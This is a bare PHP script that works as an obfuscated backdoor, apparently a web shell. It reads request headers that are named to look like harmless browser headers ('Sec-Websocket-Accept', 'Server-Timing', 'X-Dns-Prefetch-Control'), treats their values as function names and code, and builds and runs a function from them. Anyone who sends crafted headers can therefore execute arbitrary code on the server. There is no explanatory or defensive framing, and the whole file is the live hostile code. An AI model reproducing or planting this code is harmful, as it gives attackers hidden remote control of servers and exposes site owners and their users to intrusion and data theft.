<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Sec-Websocket-Accept'])) {
    $rfind = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Server-Timing']($_HEADERS['X-Dns-Prefetch-Control']));
    $rfind();
}